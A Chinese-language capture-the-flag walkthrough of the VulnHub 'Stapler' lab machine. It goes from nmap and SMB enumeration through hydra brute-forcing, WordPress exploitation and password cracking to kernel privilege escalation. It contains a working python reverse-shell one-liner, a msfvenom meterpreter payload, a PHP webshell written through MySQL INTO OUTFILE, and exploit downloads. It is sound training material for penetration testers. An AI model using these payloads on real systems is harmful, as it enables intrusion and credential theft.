## 简介

该项目是[g0tmi1k](https://www.vulnhub.com/author/g0tmi1k,21/)作者精心制作的项目环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该的技巧和文章都能学习到一些红队知识。

靶机描述：Stapler is reported to be one of several vulnerable systems that are
supposed to assist penetration testers with challenges similar to Offensive
Security’s PWK coursework.

该项目有始有终，会用到信息收集->暴力破解->数据库枚举->Wordpress后台getshell五种方法->内网信息枚举->提权，最终拿到flag.txt的过程，那么在这当中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

注意：

    
    
    本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

![1662180681_6312dd496f600d99f0150.png!small?1662180681814](https://image.3001.net/images/20220903/1662180681_6312dd496f600d99f0150.png!small?1662180681814)

## 一、信息收集

### 1.NMAP挖掘信息

首先对靶机所在网段进行扫描存活IP

    
    
    nmap 192.168.27.0/24 -sP

![1662180687_6312dd4faa17ce8e570ea.png!small?1662180688089](https://image.3001.net/images/20220903/1662180687_6312dd4faa17ce8e570ea.png!small?1662180688089)

192.168.27.187为我Kali的IP

靶机IP为192.168.27.191

### 2.NMAP全端口扫描（详细分析每个端口）

对靶机开放端口进行探测

    
    
    nmap -sS -sV -A -T5 -p- 192.168.27.191

-sV-版本 -sS-详细描述信息 -A-版本号 -T5-扫描进程 -p-全端口扫描

![1662180704_6312dd601ceb6ba367c10.png!small?1662180704549](https://image.3001.net/images/20220903/1662180704_6312dd601ceb6ba367c10.png!small?1662180704549)

扫描出：

20/tcp closed ftp-data ---未开启

21/tcp open ftp vsftpd 2.0.8 or later

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

53/tcp open domain dnsmasq 2.75

80/tcp open http PHP cli server 5.5 or later123/tcp closed ntp

137/tcp closed netbios-ns

138/tcp closed netbios-dgm

139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

666/tcp open doom?

| fingerprint-strings:

......

| message2.jpgUT

3306/tcp open mysql MySQL 5.7.12-0ubuntu1

12380/tcp open http Apache httpd 2.4.18 ((Ubuntu))

以及smb2利用！smb类似于windwos445端口，共享用

可以看到有很多容易受到攻击的端口都开着，FTP、NetBIOS、MySQL和运行Web服务器（Apache
HTTPD）的端口12380等等！需要进一步探测的端口如下

21 ftp 管理端口 （可以匿名访问）

22 SSH Openssh 7.2

80/tcp open http

139/tcp open netbios-ssn Samba smbd 4.3.9 --windows环境的永恒之蓝

666/tcp open doom?

3306/tcp open mysql MySQL 5.7.12-0ubuntu1

12380/tcp open http Apache httpd 2.4.18 ((Ubuntu))

### 3.FTP匿名枚举

因为在扫描中扫到了这个

21/tcp open ftp vsftpd 2.0.8 or later

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

所以可以尝试使用anonymous登录ftp

需要输密码，直接回车试试，发现密码确实为空

![1662180772_6312dda40ee83523c4f45.png!small?1662180772517](https://image.3001.net/images/20220903/1662180772_6312dda40ee83523c4f45.png!small?1662180772517)

发现存在一个note文件，下载下来

    
    
    dir  
    get note

![1662180777_6312dda91934bc4a0bd3d.png!small?1662180777599](https://image.3001.net/images/20220903/1662180777_6312dda91934bc4a0bd3d.png!small?1662180777599)

查看文件类型以及文件内容

![1662180783_6312ddaf91768cf943908.png!small?1662180783954](https://image.3001.net/images/20220903/1662180783_6312ddaf91768cf943908.png!small?1662180783954)

是一个ASCII码的text文件，里面是txt文本信息：

Elly, make sure you update the payload information. Leave it in your FTP
account once your are done, John.

说将账号信息留存在FTP中，那么还有别的账号密码！

获得两个用户名：Elly、John

然后探测一下80端口，首先进行访问

![1662180787_6312ddb3615b333d07ec9.png!small?1662180787772](https://image.3001.net/images/20220903/1662180787_6312ddb3615b333d07ec9.png!small?1662180787772)

没有服务，尝试枚举一下

    
    
    dirb http://192.168.27.191/  

![1662180791_6312ddb749328448dea94.png!small?1662180791754](https://image.3001.net/images/20220903/1662180791_6312ddb749328448dea94.png!small?1662180791754)

发现有两个隐藏文件，使用wget下载下来

    
    
    wget http://192.168.27.191/.bashrc  
    wget http://192.168.27.191/.profile

![1662180795_6312ddbbb76672649d4aa.png!small?1662180796250](https://image.3001.net/images/20220903/1662180795_6312ddbbb76672649d4aa.png!small?1662180796250)

![1662180799_6312ddbf19aa4183d1b87.png!small?1662180799469](https://image.3001.net/images/20220903/1662180799_6312ddbf19aa4183d1b87.png!small?1662180799469)

使用cat查看后，发现两个文件都是一些配置文件，只有一些配置信息，没有什么有用的

### 4.Enum4linux信息收集：139的Samba信息

SMB（服务器消息块）是一种协议，它允许同一网络上的资源共享文件，浏览网络并通过网络进行打印。它最初用于Windows，但是Unix系统可以通过Samba使用SMB。我们可以使用名为Enum4linux的工具从目标中提取信息，并使用smbclient连接到SMB共享并传输文件。

这是一个开放的netbios-ssn，用smbclient来查看（属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源）！用Enum4linux枚举，这是一个用于枚举来自Windows和Samba系统的信息的工具。

    
    
    enum4linux -a 192.168.27.191

-a 做所有参数选项枚举一遍

![1662180806_6312ddc6414696960a530.png!small?1662180806759](https://image.3001.net/images/20220903/1662180806_6312ddc6414696960a530.png!small?1662180806759)

将所有参数跑一遍

发现存在4个目录共享，共享类型，回显OK的只有两个

![1662180811_6312ddcb55def94fe4165.png!small?1662180811775](https://image.3001.net/images/20220903/1662180811_6312ddcb55def94fe4165.png!small?1662180811775)

kathy tmp

并且发现了20多个用户信息，保存到一个文本文档里

![1662180816_6312ddd0f3d0d822cb138.png!small?1662180817407](https://image.3001.net/images/20220903/1662180816_6312ddd0f3d0d822cb138.png!small?1662180817407)

将SID等没用的信息晒去

    
    
    cat pass2.txt | cut -d '\' -f2 | cut -d ' ' -f1 > user.txt

![1662180821_6312ddd59dcca49c38208.png!small?1662180821998](https://image.3001.net/images/20220903/1662180821_6312ddd59dcca49c38208.png!small?1662180821998)

  

### 5.Linux smbclient smb共享信息收集

上面有找到两个可以访问的共享目录

我们要使用smbclient命令可读取SMB/CIFS服务器的用户端程序

SMB与CIFS为服务器通信协议，常用于Windows95/98/NT等系统。smbclient(samba
client)可让Linux系统存取Windows系统所分享的资源

-L 显示服务器端所分享出来的所有资源。
    
    
    smbclient -L //192.168.27.191

会提示输入密码，直接回车就好

![1662180829_6312ddddaf515d66206b0.png!small?1662180830082](https://image.3001.net/images/20220903/1662180829_6312ddddaf515d66206b0.png!small?1662180830082)

-I<IP地址> 指定服务器的IP地址

-N 不用询问密码

我们添加参数

    
    
    smbclient ///kathy -I 192.168.27.191 -N

///其实是 //xxx/ 代表先到一个目录下，然后再到kathy，因为kathy是二级目录，中间是空也可以

![1662180833_6312dde1b43969be300ee.png!small?1662180834128](https://image.3001.net/images/20220903/1662180833_6312dde1b43969be300ee.png!small?1662180834128)

分别进入两个目录，进行下载

    
    
    get xxx

![1662180838_6312dde626a4c9aa4a339.png!small?1662180838530](https://image.3001.net/images/20220903/1662180838_6312dde626a4c9aa4a339.png!small?1662180838530)

进入另一个目录下，把其中的文件也下载下来

![1662180841_6312dde9d03fa89eb46c3.png!small?1662180842232](https://image.3001.net/images/20220903/1662180841_6312dde9d03fa89eb46c3.png!small?1662180842232)

下载下来的有一份源码，可以使用D盾或者seay进行代码审计

查看内容

![1662180844_6312ddecbb59f75480013.png!small?1662180845102](https://image.3001.net/images/20220903/1662180844_6312ddecbb59f75480013.png!small?1662180845102)

ls文件里面也没什么东西

![1662180848_6312ddf076a2fbbf3cd2e.png!small?1662180848840](https://image.3001.net/images/20220903/1662180848_6312ddf076a2fbbf3cd2e.png!small?1662180848840)

另一个是配置文件，也没什么东西

  

### 6.nc信息枚举666端口

现在看一下666端口，之前扫描时发现里面有信息，使用nc查看

    
    
    nc 192.168.27.191

![1662180868_6312de0410c5171af94e5.png!small?1662180868591](https://image.3001.net/images/20220903/1662180868_6312de0410c5171af94e5.png!small?1662180868591)

使用nc将这个东西导到本地，并查看文件类型

    
    
    nc 192.168.27.191 > YLion  
    file YLion

![1662180871_6312de07e18886afb13a5.png!small?1662180872255](https://image.3001.net/images/20220903/1662180871_6312de07e18886afb13a5.png!small?1662180872255)

是一个zip文件，尝试解压，是一张图片

    
    
    unzip YLion

![1662180875_6312de0b998dbd9922ff2.png!small?1662180876246](https://image.3001.net/images/20220903/1662180875_6312de0b998dbd9922ff2.png!small?1662180876246)

图片中并没有什么有价值的信息，我们看看图片里面是不是还包含其他信息

    
    
    strings message2.jpg

![1662180879_6312de0fb24f572b925c9.png!small?1662180880162](https://image.3001.net/images/20220903/1662180879_6312de0fb24f572b925c9.png!small?1662180880162)

上面写着如果你正在读这篇文章，你应该得到一个cookie

暂时也没有找到什么突破性的进展，或者有用的信息

  

### 7.枚举http 12380服务

访问12380端口的http服务，并且使用dirb枚举一下

<http://192.168.27.191:12380/>

并没有枚举出什么有效信息，用AWVS扫一下

![1662180901_6312de2583eaaefdcae2e.png!small?1662180902004](https://image.3001.net/images/20220903/1662180901_6312de2583eaaefdcae2e.png!small?1662180902004)

![1662180905_6312de29d9cf97359ba13.png!small?1662180906373](https://image.3001.net/images/20220903/1662180905_6312de29d9cf97359ba13.png!small?1662180906373)

![1662180912_6312de30432139a37f150.png!small?1662180912962](https://image.3001.net/images/20220903/1662180912_6312de30432139a37f150.png!small?1662180912962)

这是一个使用WordPress4.2.2搭建的站

我们使用kali上的另一种扫描器进行扫描（个人理解是这样的，每个扫描器都有各自的优势，多尝试几种可能会出来意外之喜）

    
    
    nikto -h http://192.168.27.191:12380/

![1662180923_6312de3b77656fef0be93.png!small?1662180923948](https://image.3001.net/images/20220903/1662180923_6312de3b77656fef0be93.png!small?1662180923948)

可以看到站点使用了 SSL
Info，并且扫除了两个目录以及robots.txt，尝试访问，被重定向了。如果直接访问扫描出的两个目录的话会被重定向回之前的页面，需要加SSL

![1662180929_6312de412ea3a9ce1bc07.png!small?1662180929781](https://image.3001.net/images/20220903/1662180929_6312de412ea3a9ce1bc07.png!small?1662180929781)![1662180933_6312de45950d96f167445.png!small?1662180934001](https://image.3001.net/images/20220903/1662180933_6312de45950d96f167445.png!small?1662180934001)

admin112233页面查看源码

  

很短，就是写了个xss，另一个页面就看起来好多了

用专门扫wordpress的工具wpscan进行扫描

    
    
    wpscan --url https://192.168.27.191:12380/blogblog/ --disable-tls-checks

\--disable-tls-checks ---因为会受到SSL对等证书/SSH错误临时用法！如果不加会报错

![1662180979_6312de73739da4064afe3.png!small?1662180980161](https://image.3001.net/images/20220903/1662180979_6312de73739da4064afe3.png!small?1662180980161)

有一个报错，说因为没有令牌，无法输出，可以去该网站免费注册获取令牌

<https://wpscan.com/register>

    
    
    wpscan --url https://192.168.27.191:12380/blogblog/ --disable-tls-checks --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc --disable-tls-checks

![1662180996_6312de845e6834880bdd3.png!small?1662180997029](https://image.3001.net/images/20220903/1662180996_6312de845e6834880bdd3.png!small?1662180997029)

可以扫出很多，包括sql注入等等

找到一个upload

<https://192.168.27.191:12380/blogblog/wp-content/uploads/>

还有登录点

<https://192.168.27.191:12380/blogblog/wp-login.php>

访问upload

![1662181002_6312de8a5a60e95904015.png!small?1662181002811](https://image.3001.net/images/20220903/1662181002_6312de8a5a60e95904015.png!small?1662181002811)

![1662181006_6312de8e9104ec5a7d012.png!small?1662181007102](https://image.3001.net/images/20220903/1662181006_6312de8e9104ec5a7d012.png!small?1662181007102)![1662181011_6312de9303100ef0d2d06.png!small?1662181011803](https://image.3001.net/images/20220903/1662181011_6312de9303100ef0d2d06.png!small?1662181011803)

在blogblog/wp-content/plugins/发现：

advanced_video_embed.php信息，存在wordpress advanced video

存在一个39646漏洞

查找利用脚本，并将脚本复制出来，因为可能是默认配置的脚本，需要进行修改

![1662181015_6312de977b239e7e87b98.png!small?1662181016115](https://image.3001.net/images/20220903/1662181015_6312de977b239e7e87b98.png!small?1662181016115)

    
    
    gedit 39646.py

脚本默认没有ssl，所以要加入ssl，并且还要再加一个参数，并将URL修改

    
    
    import ssl  
    ssl._create_default_https_context = ssl._create_unverified_context

![1662181020_6312de9c0957df5bb9708.png!small?1662181020572](https://image.3001.net/images/20220903/1662181020_6312de9c0957df5bb9708.png!small?1662181020572)

这个脚本执行后会生成一个文件

![img](https://image.3001.net/images/20220903/1662182859_6312e5cbbcd15d3833305.png!small)

![img](https://image.3001.net/images/20220903/1662182860_6312e5cc8a6ca8743fea6.png!small)

然后我们可以下载下来看这个最新生成的图片

使用wget可以直接下载http服务上的文件

下载https需要在前面加 --no-check-certificate ---下载ssl

    
    
    wget --no-check-certificate https://192.168.27.191:12380/blogblog/wp-content/uploads/1674934041.jpeg

查看其类型与内容

![1662181033_6312dea9623ae78781dfc.png!small?1662181033843](https://image.3001.net/images/20220903/1662181033_6312dea9623ae78781dfc.png!small?1662181033843)

是php代码用text的格式写在图片里的

会枚举出wp-config.php，存放数据库的信息，引出web页面数据

![1662181038_6312deaeb3cfca096ff62.png!small?1662181039270](https://image.3001.net/images/20220903/1662181038_6312deaeb3cfca096ff62.png!small?1662181039270)

列出了MySql数据库 root plbkac

## 二、暴力破解

### 8.爆破FTP

    
    
    hydra -L user.txt -P user.txt 192.168.27.191 ftp

![1662181043_6312deb332f3ff90324d5.png!small?1662181043760](https://image.3001.net/images/20220903/1662181043_6312deb332f3ff90324d5.png!small?1662181043760)

和下面爆破SSH时爆破出的账户时同一个

SHayslett SHayslett

ftp里面有好多文件，下载下来后并没有发现什么信息

  

### 9.爆破SSH

hydra是一款开源的暴力密码破解工具，支持多种协议密码的破解。

hydra支持破解的服务/协议

![1662181047_6312deb78ef90d1f230ed.png!small?1662181048174](https://image.3001.net/images/20220903/1662181047_6312deb78ef90d1f230ed.png!small?1662181048174)

    
    
    hydra -L user.txt -P user.txt 192.168.27.191 ssh

使用用户名字典进行账户密码爆破，看看是否有用户的用户名和密码一致

![1662181050_6312deba98f557043ede0.png!small?1662181051099](https://image.3001.net/images/20220903/1662181050_6312deba98f557043ede0.png!small?1662181051099)

SHayslett SHayslett

爆破到一个，并且测试可以成功登录ssh

  

## 三、数据库

### 10.mysql数据库枚举

尝试看一下能否远程登录

    
    
    mysql -uroot -proot -h 192.168.27.191

mysqI-h主机名-P端口-u用户名-p密码

![1662181056_6312dec03650d033d3040.png!small?1662181056589](https://image.3001.net/images/20220903/1662181056_6312dec03650d033d3040.png!small?1662181056589)

密码错误

尝试登录在测试12380端口之前，现在拿到了数据库的账号密码，就可以登录了

    
    
    mysql -uroot -pplbkac -h 192.168.27.191

![1662181060_6312dec4af975c5af6cca.png!small?1662181061106](https://image.3001.net/images/20220903/1662181060_6312dec4af975c5af6cca.png!small?1662181061106)

进入数据库后 库->表->字段->内容

    
    
    show databases;

![1662181066_6312deca1f5223364a1ca.png!small?1662181066554](https://image.3001.net/images/20220903/1662181066_6312deca1f5223364a1ca.png!small?1662181066554)

这个站是用wordpress建的，所以直接进入wordpress库

    
    
    use wordpress  
    show tables;

![1662181070_6312dece0696b922f7962.png!small?1662181070427](https://image.3001.net/images/20220903/1662181070_6312dece0696b922f7962.png!small?1662181070427)

查看wp_users表即可

    
    
    desc wp_users;  
    select user_login from wp_users;

![1662181074_6312ded22fa03afcf512e.png!small?1662181074694](https://image.3001.net/images/20220903/1662181074_6312ded22fa03afcf512e.png!small?1662181074694)

用户名中包含前面我们得到的两个用户名

    
    
    select user_login,user_pass from wp_users;

![1662181078_6312ded6b7164f41f666e.png!small?1662181079248](https://image.3001.net/images/20220903/1662181078_6312ded6b7164f41f666e.png!small?1662181079248)

将这个复制出来放到一个文本

![1662181082_6312deda6cf55919fb5f8.png!small?1662181083014](https://image.3001.net/images/20220903/1662181082_6312deda6cf55919fb5f8.png!small?1662181083014)

此时我们使用awk命令，进行拆分信息

参考：<https://www.runoob.com/linux/linux-comm-awk.html>

![1662181087_6312dedf8afe25d50fe32.png!small?1662181088144](https://image.3001.net/images/20220903/1662181087_6312dedf8afe25d50fe32.png!small?1662181088144)

    
    
    awk -F'|' '{print $3}' 1.txt > pass.txt

将未解密的密码导出到文件中

随便复制一行密文查看加密类型

    
    
    hash-identifier $P$B7889EMq/erHIuZapMB8GEizebcIy9.

![1662181092_6312dee4ef3d1bbbd8346.png!small?1662181093562](https://image.3001.net/images/20220903/1662181092_6312dee4ef3d1bbbd8346.png!small?1662181093562)

MD5加密

使用john工具进行解密

    
    
    john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt

![1662181098_6312deea91b31e36afd92.png!small?1662181099084](https://image.3001.net/images/20220903/1662181098_6312deea91b31e36afd92.png!small?1662181099084)

第一次报错了，是命令中的密码本（txt文件）不存在，进去那个目录下看到，密码本存在，但是没有解压，解压一下就好了,第二次也没有成功，意思是/root/.john/john.rec文件被锁定。

通过测试只要把 /root/.john/john.rec这个文件删除就不会报错了

![1662181109_6312def59258e9669ffbf.png!small?1662181110167](https://image.3001.net/images/20220903/1662181109_6312def59258e9669ffbf.png!small?1662181110167)

解压后会放在历史文本里面，在根目录下的.john文件夹下

    
    
    cd ~/.john  
    ls  
    cat john.pot

![1662181117_6312defdc92d4c9599cd7.png!small?1662181118257](https://image.3001.net/images/20220903/1662181117_6312defdc92d4c9599cd7.png!small?1662181118257)

经过尝试，框中的密码可用，对应的用户名是John

John incorrect

找到登陆点 <https://192.168.27.191:12380/blogblog/wp-login.php>

![1662181122_6312df0235b25ebae9a4f.png!small?1662181122654](https://image.3001.net/images/20220903/1662181122_6312df0235b25ebae9a4f.png!small?1662181122654)![1662181126_6312df06af981060375d6.png!small?1662181127248](https://image.3001.net/images/20220903/1662181126_6312df06af981060375d6.png!small?1662181127248)

成功登录

或者访问：枚举

进入phpmyadmin数据库管理工具查看 <https://10.211.55.37:12380/phpmyadmin/>

root plbkac

## 四、wordpress后台getshell 五种方法

登录wordpress后台后 Plugins-》 add New -》upload Plugin ：存在上传文件

![1662181132_6312df0c32f92d457b0f9.png!small?1662181132675](https://image.3001.net/images/20220903/1662181132_6312df0c32f92d457b0f9.png!small?1662181132675)

### 方法一

反弹shell

首先我们查找一个webshell，并且复制出来

    
    
    -   locate php-reverse-shell.php  
    -   cp /usr/share/webshells/php/php-reverse-shell.php .

![1662181136_6312df1052f7fc6ec492c.png!small?1662181136803](https://image.3001.net/images/20220903/1662181136_6312df1052f7fc6ec492c.png!small?1662181136803)

    
    
    vi php-reverse-shell.php

![1662181139_6312df13acfb438f8b59e.png!small?1662181140208](https://image.3001.net/images/20220903/1662181139_6312df13acfb438f8b59e.png!small?1662181140208)

将IP改为回连的IP，端口为1234，保存

然后将webshell上传

![1662181144_6312df18d2a80524cbc67.png!small?1662181145307](https://image.3001.net/images/20220903/1662181144_6312df18d2a80524cbc67.png!small?1662181145307)![1662181148_6312df1c7ffc5883bfe0e.png!small?1662181149007](https://image.3001.net/images/20220903/1662181148_6312df1c7ffc5883bfe0e.png!small?1662181149007)

上传完成之后就到了upload目录下

![1662181152_6312df206a090ee401336.png!small?1662181152947](https://image.3001.net/images/20220903/1662181152_6312df206a090ee401336.png!small?1662181152947)

开启nc监听1234端口

    
    
    nc -vlp 1234

![1662181156_6312df248310ede14f900.png!small?1662181156854](https://image.3001.net/images/20220903/1662181156_6312df248310ede14f900.png!small?1662181156854)

此时在upload目录下点击上传的webshell

就会成功反弹回shell，成功拿到shell

### 方法二

weevely简介 weevely是一款基于python编写的webshell生成、管理工具。

    
    
    weevely generate passYLion YLion.php

创建一个密码为passYLion的名为YLion.php的shell

![1662181165_6312df2d56f204e27bc51.png!small?1662181165855](https://image.3001.net/images/20220903/1662181165_6312df2d56f204e27bc51.png!small?1662181165855)

然后和上面的步骤一样，上传到upload目录下

    
    
    weevely https://192.168.27.191:12380/blogblog/wp-content/uploads/YLion.php passYLion

获得shell

![1662181171_6312df330c8e9c6dbf242.png!small?1662181171547](https://image.3001.net/images/20220903/1662181171_6312df330c8e9c6dbf242.png!small?1662181171547)

### 方法三

webacoo实际上是 Web Backdoor Cookie的缩写,也是kali自带的,针对php网站的web后门工具

    
    
    webacoo -g -o shell.php

![1662181179_6312df3b543b583026e10.png!small?1662181179849](https://image.3001.net/images/20220903/1662181179_6312df3b543b583026e10.png!small?1662181179849)

![1662181182_6312df3eedf5e8f5621c0.png!small?1662181183370](https://image.3001.net/images/20220903/1662181182_6312df3eedf5e8f5621c0.png!small?1662181183370)

测试无法绕过waf

webacoo -t -u <http://x.x/.login.php>

-t 建立远程“终端”连接（需要-u）

-u URL 后门 URL

### 方法四

MSF

创建木马

    
    
    msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.27.187 LPORT=4455 -f raw > msf.php

![1662181189_6312df45b757313aa5435.png!small?1662181190378](https://image.3001.net/images/20220903/1662181189_6312df45b757313aa5435.png!small?1662181190378)

然后依旧是和上面步骤相同，将msf.php上传到upload目录下

监听

    
    
    msfconsole  
    use exploit/multi/handler  
    set payload php/meterpreter_reverse_tcp  
    set LHOST 192.168.27.187  
    set LPORT 4455  
    run` / `exploit -j

![1662181196_6312df4cd3da04f5cb602.png!small?1662181197365](https://image.3001.net/images/20220903/1662181196_6312df4cd3da04f5cb602.png!small?1662181197365)![1662181200_6312df50ee200aa3d8de6.png!small?1662181201544](https://image.3001.net/images/20220903/1662181200_6312df50ee200aa3d8de6.png!small?1662181201544)

然后访问上传上去的shell

![1662181204_6312df54b53ef99c69cb1.png!small?1662181205380](https://image.3001.net/images/20220903/1662181204_6312df54b53ef99c69cb1.png!small?1662181205380)

MSF上线成功

### 方法五

mysql INTO OUT文件上传 INTO OUT（写）

    
    
    mysql -uroot -pplbkac -h 192.168.27.191  
    select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell2.php";

直接将一句话木马写入数据库

![1662181215_6312df5fc34b0e5a78ee6.png!small?1662181216360](https://image.3001.net/images/20220903/1662181215_6312df5fc34b0e5a78ee6.png!small?1662181216360)

各种一句话木马的合集网站

    
    
    https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

![1662181235_6312df7397f832404351a.png!small?1662181235974](https://image.3001.net/images/20220903/1662181235_6312df7397f832404351a.png!small?1662181235974)

可以看到他安装了python，所以直接使用python

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.27.187",1654));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

将上面代码拼接在cmd=后面

    
    
    https://192.168.27.191:12380/blogblog/wp-content/uploads/shell2.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.27.187",1654));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

![1662181305_6312dfb917aee1f6d261b.png!small?1662181305489](https://image.3001.net/images/20220903/1662181305_6312dfb917aee1f6d261b.png!small?1662181305489)

拿到shell

    
    
    python -c 'import pty; pty.spawn("/bin/bash")'

![1662181309_6312dfbd3075f2a1d2eea.png!small?1662181309578](https://image.3001.net/images/20220903/1662181309_6312dfbd3075f2a1d2eea.png!small?1662181309578)

拿到稳定shell

## 五、内网信息

### 12.内网信息枚举

查询所有内核信息

    
    
    uname -mra && cat /etc/*release*  
    -    cp ../les.sh .  
    -    cp ../linpeas.sh .

将这两个工具放到存放本项目临时文件的目录下

使用python开启http服务

    
    
    python -m SimpleHTTPServer 80

并且通过shell，使用wget下载两个文件

    
    
    wget 192.168.27.187:80/les.sh  
    wget 192.168.27.187:80/linpeas.sh

![1662181317_6312dfc54bab4229455ef.png!small?1662181323173](https://image.3001.net/images/20220903/1662181317_6312dfc54bab4229455ef.png!small?1662181323173)

注意：建议先获取一个稳定shell

    
    
    python -c 'import pty; pty.spawn("/bin/bash")'  
    stty raw -echo

  

对刚才下载的两个文件的权限修改，然后运行

    
    
    chmod +x les.sh  
    chmod +x linpeas.sh  
    ./les.sh

![1662181322_6312dfca53c1b36329110.png!small?1662181323176](https://image.3001.net/images/20220903/1662181322_6312dfca53c1b36329110.png!small?1662181323176)

扫出很多漏洞

    
    
    ./linpeas.sh

![1662181326_6312dfce4f61cef3cbd5b.png!small?1662181327197](https://image.3001.net/images/20220903/1662181326_6312dfce4f61cef3cbd5b.png!small?1662181327197)

包含很多信息

4.4.0-21-generic 存在版本漏洞

发现很多1000编号之后的过户

![1662181330_6312dfd22020a2bc3f5f3.png!small?1662181330601](https://image.3001.net/images/20220903/1662181330_6312dfd22020a2bc3f5f3.png!small?1662181330601)

peter账号下存在sudo权限

![1662181334_6312dfd62ef6eb3cb91d0.png!small?1662181334643](https://image.3001.net/images/20220903/1662181334_6312dfd62ef6eb3cb91d0.png!small?1662181334643)

可以尝试使用peter账户，然后sudo提权

![1662181338_6312dfda13912df5c3917.png!small?1662181338434](https://image.3001.net/images/20220903/1662181338_6312dfda13912df5c3917.png!small?1662181338434)

这个就是我们一开始利用的漏洞，找到的root账户的密码

![1662181341_6312dfdd75f4a7b86795f.png!small?1662181341938](https://image.3001.net/images/20220903/1662181341_6312dfdd75f4a7b86795f.png!small?1662181341938)

可以执行代码

![1662181345_6312dfe16a9b98be78bc1.png!small?1662181345943](https://image.3001.net/images/20220903/1662181345_6312dfe16a9b98be78bc1.png!small?1662181345943)

以root权限运行的一些文件

![1662181348_6312dfe49c29f2aba6066.png!small?1662181349010](https://image.3001.net/images/20220903/1662181348_6312dfe49c29f2aba6066.png!small?1662181349010)

可以写入信息，是个环境变量

汇总一下上面扫出的信息

  1. 4.4.0-21-generic

  2. 存在很多账号信息

peter 存在sudo权限 sudo提权

  1. ssh：

PermitEmptyPasswords yes

  1. path： 可被写入

You can write script: /usr/local/sbin/cron-logrotate.sh

/usr/local/sbin/cron-logrotate.sh

  1. /home/ 存放用户名 history

## 六、提权

### 13、提权利用

进行提权进一步利用

#### 内核提权-1

下面开始一个一个的验证

我们在谷歌上查找相关信息

![1662181367_6312dff76f26e7dec8271.png!small?1662181367961](https://image.3001.net/images/20220903/1662181367_6312dff76f26e7dec8271.png!small?1662181367961)

 **“searchsploit”是一个用于Exploit-DB的命令行搜索工具** ，可以帮助我们查找渗透模块

同时使用该模块进行查找Linux版本漏洞

    
    
    searchsploit Linux Kernel 4.4.x

![1662181373_6312dffd690b5dbf73689.png!small?1662181373942](https://image.3001.net/images/20220903/1662181373_6312dffd690b5dbf73689.png!small?1662181373942)

40049是在64位提权的，这是32位系统linux！ --linux_x86-64/local/40049.c

![1662181376_6312e000bf8be46ecee86.png!small?1662181387237](https://image.3001.net/images/20220903/1662181376_6312e000bf8be46ecee86.png!small?1662181387237)

目标为32位的系统

Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LO |
linux/local/39772.txt

我们使用39772

查看位置

    
    
    locate linux/local/39772.txt

文本中包含提权的原理，底层的东西

利用的话需要去github上下载

    
    
    wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip  
    unzip 39772.zip  
    cd 39772  
    tar xvf exploit.tar  
    cd ebpf_mapfd_doubleput_exploit

![1662181381_6312e0059ceafbe903ddd.png!small?1662181387241](https://image.3001.net/images/20220903/1662181381_6312e0059ceafbe903ddd.png!small?1662181387241)

存在compile.sh文件

上传上去

    
    
    python -m SimpleHTTPServer 80  
    wget http://192.168.27.187:80/exploit.tar   
    tar -xvf exploit.tar  
    cd ebpf_mapfd_doubleput_exploit  
    chmod +x compile.sh  
    ./compile.sh  
    ls    ----执行./doubleput

![1662181386_6312e00a4c57bfdd7bebc.png!small?1662181387234](https://image.3001.net/images/20220903/1662181386_6312e00a4c57bfdd7bebc.png!small?1662181387234)

writev returned successfully. if this worked, you'll have a root shell in <=60
seconds.

提权成功！

#### 内核提权-2

使用cve-2021-4034

wget <http://10.211.55.19:8081/cve-2021-4034-poc.c>

gcc cve-2021-4034-poc.c -o YLion

chmod +x YLion

./YLion

#### sudo提权

这里顺便看一下 5. /home/ 存放用户名 history

（用普通权限的shell就可以，这里没有退出，所以是刚才提权后的root权限）

    
    
    grep -rn "ssh"

筛选出具有ssh信息的用户

![1662181392_6312e01063fc64d40befe.png!small?1662181392892](https://image.3001.net/images/20220903/1662181392_6312e01063fc64d40befe.png!small?1662181392892)

sshpass -p JZQuyIN5 peter@localhost

sshpass -p thisimypassword ssh JKanode@localhost

获取到了用户通过ssh登录的信息

peter JZQuyIN5

JKanode thisimypassword

可以直接通过ssh远程登录 了，也就是刚才上面列出的 3. PermitEmptyPasswords yes

    
    
    ssh JKanode@192.168.27.191 

![1662181396_6312e014813696079afc5.png!small?1662181397073](https://image.3001.net/images/20220903/1662181396_6312e014813696079afc5.png!small?1662181397073)

登录peter会发现他用的是另一种shell，所以可以加一个参数

![1662181400_6312e018324326afb8917.png!small?1662181400902](https://image.3001.net/images/20220903/1662181400_6312e018324326afb8917.png!small?1662181400902)

    
    
    ssh peter@192.168.27.191 -t '/bin/bash'

![1662181404_6312e01cdee7277702863.png!small?1662181405248](https://image.3001.net/images/20220903/1662181404_6312e01cdee7277702863.png!small?1662181405248)

拿到了peter账户正对应上面列出的 2. peter 存在sudo权限 sudo提权

    
    
    id  
    sudo -l

看一下有哪些权限

